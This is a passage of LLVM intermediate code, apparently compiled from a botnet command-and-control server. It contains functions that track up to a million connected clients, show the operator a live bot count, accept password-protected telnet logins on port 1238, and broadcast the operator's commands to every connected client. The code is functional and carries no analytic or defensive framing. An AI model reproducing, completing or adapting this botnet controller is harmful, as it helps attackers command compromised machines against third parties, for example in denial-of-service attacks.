  %209 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %209, i8 0, i64 2048, i1 false)
  %210 = icmp ne i8* %209, null
  br i1 %210, label %211, label %217

211:                                              ; preds = %208
  %212 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %213 = load i32, i32* %13, align 4
  %214 = call i32 @fdgets(i8* %212, i32 2048, i32 %213)
  %215 = sext i32 %214 to i64
  store i64 %215, i64* %16, align 8
  %216 = icmp sgt i64 %215, 0
  br label %217

217:                                              ; preds = %211, %208
  %218 = phi i1 [ false, %208 ], [ %216, %211 ]
  br i1 %218, label %219, label %280

219:                                              ; preds = %217
  %220 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %221 = call i8* @strstr(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #8
  %222 = icmp eq i8* %221, null
  br i1 %222, label %223, label %224

223:                                              ; preds = %219
  store i32 1, i32* %15, align 4
  br label %280

224:                                              ; preds = %219
  %225 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %225)
  %226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %227 = call i32 @strcmp(i8* %226, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %229, label %235

229:                                              ; preds = %224
  %230 = load i32, i32* %13, align 4
  %231 = call i64 @send(i32 %230, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0), i64 5, i32 16384)
  %232 = icmp eq i64 %231, -1
  br i1 %232, label %233, label %234

233:                                              ; preds = %229
  store i32 1, i32* %15, align 4
  br label %280

234:                                              ; preds = %229
  br label %208, !llvm.loop !13

235:                                              ; preds = %224
  %236 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %237 = call i8* @strstr(i8* %236, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.13, i64 0, i64 0)) #8
  %238 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %239 = icmp eq i8* %237, %238
  br i1 %239, label %240, label %258

240:                                              ; preds = %235
  %241 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %242 = call i8* @strstr(i8* %241, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.13, i64 0, i64 0)) #8
  %243 = getelementptr inbounds i8, i8* %242, i64 6
  store i8* %243, i8** %18, align 8
  %244 = load i8*, i8** %18, align 8
  %245 = call i64 @strlen(i8* %244) #8
  %246 = icmp ugt i64 %245, 6
  br i1 %246, label %247, label %249

247:                                              ; preds = %240
  %248 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.14, i64 0, i64 0))
  store i32 1, i32* %15, align 4
  br label %280

249:                                              ; preds = %240
  %250 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %251 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %250, i32 0, i32 1
  %252 = getelementptr inbounds [7 x i8], [7 x i8]* %251, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %252, i8 0, i64 7, i1 false)
  %253 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %254 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %253, i32 0, i32 1
  %255 = getelementptr inbounds [7 x i8], [7 x i8]* %254, i64 0, i64 0
  %256 = load i8*, i8** %18, align 8
  %257 = call i8* @strcpy(i8* %255, i8* %256) #9
  br label %208, !llvm.loop !13

258:                                              ; preds = %235
  %259 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %260 = call i8* @strstr(i8* %259, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i64 0, i64 0)) #8
  %261 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %262 = icmp eq i8* %260, %261
  br i1 %262, label %263, label %272

263:                                              ; preds = %258
  %264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %265 = call i8* @strstr(i8* %264, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i64 0, i64 0)) #8
  %266 = getelementptr inbounds i8, i8* %265, i64 7
  store i8* %266, i8** %19, align 8
  %267 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %268 = load i8*, i8** %19, align 8
  %269 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %267, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i64 0, i64 0), i8* %268)
  %270 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %271 = call i32 @fflush(%struct._IO_FILE* %270)
  br label %208, !llvm.loop !13

272:                                              ; preds = %258
  %273 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %274 = call i32 @strcmp(i8* %273, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.17, i64 0, i64 0)) #8
  %275 = icmp eq i32 %274, 0
  br i1 %275, label %276, label %277

276:                                              ; preds = %272
  br label %208, !llvm.loop !13

277:                                              ; preds = %272
  %278 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %279 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.18, i64 0, i64 0), i8* %278)
  br label %208, !llvm.loop !13

280:                                              ; preds = %247, %233, %223, %217
  %281 = load i64, i64* %16, align 8
  %282 = icmp eq i64 %281, -1
  br i1 %282, label %283, label %289

283:                                              ; preds = %280
  %284 = call i32* @__errno_location() #10
  %285 = load i32, i32* %284, align 4
  %286 = icmp ne i32 %285, 11
  br i1 %286, label %287, label %288

287:                                              ; preds = %283
  store i32 1, i32* %15, align 4
  br label %288

288:                                              ; preds = %287, %283
  br label %295

289:                                              ; preds = %280
  %290 = load i64, i64* %16, align 8
  %291 = icmp eq i64 %290, 0
  br i1 %291, label %292, label %293

292:                                              ; preds = %289
  store i32 1, i32* %15, align 4
  br label %295

293:                                              ; preds = %289
  br label %294

294:                                              ; preds = %293
  br label %206

295:                                              ; preds = %292, %288
  %296 = load i32, i32* %15, align 4
  %297 = icmp ne i32 %296, 0
  br i1 %297, label %298, label %303

298:                                              ; preds = %295
  %299 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %300 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %299, i32 0, i32 2
  store i8 0, i8* %300, align 1
  %301 = load i32, i32* %13, align 4
  %302 = call i32 @close(i32 %301)
  br label %303

303:                                              ; preds = %298, %295
  br label %304

304:                                              ; preds = %303
  br label %305

305:                                              ; preds = %304
  br label %306

306:                                              ; preds = %305, %192, %57
  %307 = load i32, i32* %7, align 4
  %308 = add nsw i32 %307, 1
  store i32 %308, i32* %7, align 4
  br label %26, !llvm.loop !14

309:                                              ; preds = %26
  br label %22
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.37, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.37, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @titleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %20
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @clientsConnected()
  %11 = load volatile i32, i32* @managesConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.19, i64 0, i64 0), i32 27, i32 %10, i32 %11, i32 7) #9
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %7
  ret i8* null

20:                                               ; preds = %7
  %21 = call i32 @sleep(i32 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca [2048 x i8], align 16
  store i8* %0, i8** %3, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = ptrtoint i8* %7 to i32
  store i32 %8, i32* %4, align 4
  %9 = load volatile i32, i32* @managesConnected, align 4
  %10 = add nsw i32 %9, 1
  store volatile i32 %10, i32* @managesConnected, align 4
  %11 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %11, i8 0, i64 2048, i1 false)
  %12 = load i32, i32* %4, align 4
  %13 = call i64 @send(i32 %12, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i64 0, i64 0), i64 10, i32 16384)
  %14 = icmp eq i64 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  br label %84

16:                                               ; preds = %1
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %18 = load i32, i32* %4, align 4
  %19 = call i32 @fdgets(i8* %17, i32 2048, i32 %18)
  %20 = icmp slt i32 %19, 1
  br i1 %20, label %21, label %22

21:                                               ; preds = %16
  br label %84

22:                                               ; preds = %16
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  call void @trim(i8* %23)
  %24 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %25 = call i32 @strcmp(i8* %24, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.21, i64 0, i64 0)) #8
  %26 = icmp ne i32 %25, 0
  br i1 %26, label %27, label %28

27:                                               ; preds = %22
  br label %84

28:                                               ; preds = %22
  %29 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %29, i8 0, i64 2048, i1 false)
  %30 = load i32, i32* %4, align 4
  %31 = call i64 @send(i32 %30, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i64 0, i64 0), i64 4, i32 16384)
  %32 = icmp eq i64 %31, -1
  br i1 %32, label %33, label %34

33:                                               ; preds = %28
  br label %84

34:                                               ; preds = %28
  %35 = load i8*, i8** %3, align 8
  %36 = call i32 @pthread_create(i64* %5, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %35) #9
  %37 = load i32, i32* %4, align 4
  %38 = call i64 @send(i32 %37, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.23, i64 0, i64 0), i64 48, i32 16384)
  %39 = icmp eq i64 %38, -1
  br i1 %39, label %40, label %41

40:                                               ; preds = %34
  br label %84

41:                                               ; preds = %34
  %42 = load i32, i32* %4, align 4
  %43 = call i64 @send(i32 %42, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.24, i64 0, i64 0), i64 43, i32 16384)
  %44 = icmp eq i64 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %41
  br label %84

46:                                               ; preds = %41
  %47 = load i32, i32* %4, align 4
  %48 = call i64 @send(i32 %47, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.25, i64 0, i64 0), i64 53, i32 16384)
  %49 = icmp eq i64 %48, -1
  br i1 %49, label %50, label %51

50:                                               ; preds = %46
  br label %84

51:                                               ; preds = %46
  %52 = load i32, i32* %4, align 4
  %53 = call i64 @send(i32 %52, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.26, i64 0, i64 0), i64 51, i32 16384)
  %54 = icmp eq i64 %53, -1
  br i1 %54, label %55, label %56

55:                                               ; preds = %51
  br label %84

56:                                               ; preds = %51
  %57 = load i32, i32* %4, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %58
  %60 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %59, i32 0, i32 0
  store i32 1, i32* %60, align 4
  br label %61

61:                                               ; preds = %77, %76, %56
  %62 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %63 = load i32, i32* %4, align 4
  %64 = call i32 @fdgets(i8* %62, i32 2048, i32 %63)
  %65 = icmp sgt i32 %64, 0
  br i1 %65, label %66, label %83

66:                                               ; preds = %61
  %67 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  call void @trim(i8* %67)
  %68 = load i32, i32* %4, align 4
  %69 = call i64 @send(i32 %68, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.27, i64 0, i64 0), i64 11, i32 16384)
  %70 = icmp eq i64 %69, -1
  br i1 %70, label %71, label %72

71:                                               ; preds = %66
  br label %84

72:                                               ; preds = %66
  %73 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %74 = call i64 @strlen(i8* %73) #8
  %75 = icmp eq i64 %74, 0
  br i1 %75, label %76, label %77

76:                                               ; preds = %72
  br label %61, !llvm.loop !16

77:                                               ; preds = %72
  %78 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.28, i64 0, i64 0), i8* %78)
  %80 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %81 = load i32, i32* %4, align 4
  call void @broadcast(i8* %80, i32 %81)
  %82 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %82, i8 0, i64 2048, i1 false)
  br label %61, !llvm.loop !16

83:                                               ; preds = %61
  br label %84

84:                                               ; preds = %83, %71, %55, %50, %45, %40, %33, %27, %21, %15
  %85 = load i32, i32* %4, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %86
  %88 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %87, i32 0, i32 0
  store i32 0, i32* %88, align 4
  %89 = load i32, i32* %4, align 4
  %90 = call i32 @close(i32 %89)
  %91 = load volatile i32, i32* @managesConnected, align 4
  %92 = add nsw i32 %91, -1
  store volatile i32 %92, i32* @managesConnected, align 4
  %93 = load i8*, i8** %2, align 8
  ret i8* %93
}

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetListener(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.29, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = call zeroext i16 @htons(i16 zeroext 1238) #10
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %18, i16* %19, align 2
  %20 = load i32, i32* %3, align 4
  %21 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %22 = call i32 @bind(i32 %20, %struct.sockaddr* %21, i32 16) #9
  %23 = icmp slt i32 %22, 0
  br i1 %23, label %24, label %25

24:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.30, i64 0, i64 0))
  br label %25

25:                                               ; preds = %24, %13
  %26 = load i32, i32* %3, align 4
  %27 = call i32 @listen(i32 %26, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %28

28:                                               ; preds = %25, %35
  %29 = load i32, i32* %3, align 4
  %30 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %31 = call i32 @accept(i32 %29, %struct.sockaddr* %30, i32* %5)
  store i32 %31, i32* %4, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp slt i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %28
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.31, i64 0, i64 0))
  br label %35

35:                                               ; preds = %34, %28
  %36 = load i32, i32* %4, align 4
  %37 = sext i32 %36 to i64
  %38 = inttoptr i64 %37 to i8*
  %39 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %38) #9
  br label %28
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.epoll_event, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %12 = load i32, i32* %4, align 4
  %13 = icmp ne i32 %12, 3
  br i1 %13, label %14, label %20

14:                                               ; preds = %2
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %15, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.32, i64 0, i64 0), i8* %18)
  call void @exit(i32 1) #11
  unreachable

20:                                               ; preds = %2
  %21 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.33, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.34, i64 0, i64 0))
  store %struct._IO_FILE* %21, %struct._IO_FILE** @fileFD, align 8
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 2
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @atoi(i8* %24) #8
  store i32 %25, i32* %7, align 4
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @create_and_bind(i8* %28)
  store volatile i32 %29, i32* @listenFD, align 4
  %30 = load volatile i32, i32* @listenFD, align 4
  %31 = icmp eq i32 %30, -1
  br i1 %31, label %32, label %33

32:                                               ; preds = %20
  call void @abort() #11
  unreachable

33:                                               ; preds = %20
  %34 = load volatile i32, i32* @listenFD, align 4
  %35 = call i32 @make_socket_non_blocking(i32 %34)
  store i32 %35, i32* %6, align 4
  %36 = load i32, i32* %6, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

38:                                               ; preds = %33
  call void @abort() #11
  unreachable

39:                                               ; preds = %33
  %40 = load volatile i32, i32* @listenFD, align 4
  %41 = call i32 @listen(i32 %40, i32 4096) #9
  store i32 %41, i32* %6, align 4
  %42 = load i32, i32* %6, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

44:                                               ; preds = %39
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.35, i64 0, i64 0))
  call void @abort() #11
  unreachable

45:                                               ; preds = %39
  %46 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %46, i32* @epollFD, align 4
  %47 = load volatile i32, i32* @epollFD, align 4
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %50

49:                                               ; preds = %45
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.36, i64 0, i64 0))
  call void @abort() #11
  unreachable

50:                                               ; preds = %45
  %51 = load volatile i32, i32* @listenFD, align 4
  %52 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 1
  %53 = bitcast %union.epoll_data* %52 to i32*
  store i32 %51, i32* %53, align 1
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 0
  store i32 -2147483647, i32* %54, align 1
  %55 = load volatile i32, i32* @epollFD, align 4
  %56 = load volatile i32, i32* @listenFD, align 4
  %57 = call i32 @epoll_ctl(i32 %55, i32 1, i32 %56, %struct.epoll_event* %8) #9
  store i32 %57, i32* %6, align 4
  %58 = load i32, i32* %6, align 4
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %61

60:                                               ; preds = %50
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0))
  call void @abort() #11
  unreachable

61:                                               ; preds = %50
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, 2
  %64 = zext i32 %63 to i64
  %65 = call i8* @llvm.stacksave()
  store i8* %65, i8** %9, align 8
  %66 = alloca i64, i64 %64, align 16
  store i64 %64, i64* %10, align 8
  br label %67

67:                                               ; preds = %71, %61
  %68 = load i32, i32* %7, align 4
  %69 = add nsw i32 %68, -1
  store i32 %69, i32* %7, align 4
  %70 = icmp ne i32 %68, 0
  br i1 %70, label %71, label %77

71:                                               ; preds = %67
  %72 = load i32, i32* %7, align 4
  %73 = add nsw i32 %72, 1
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i64, i64* %66, i64 %74
  %76 = call i32 @pthread_create(i64* %75, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #9
  br label %67, !llvm.loop !17

77:                                               ; preds = %67
  %78 = getelementptr inbounds i64, i64* %66, i64 0
  %79 = call i32 @pthread_create(i64* %78, %union.pthread_attr_t* null, i8* (i8*)* @telnetListener, i8* null) #9
  br label %80

80:                                               ; preds = %81, %77
  br label %81

81:                                               ; preds = %80
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1)
  %82 = call i32 @sleep(i32 60)
  br label %80
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.38, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
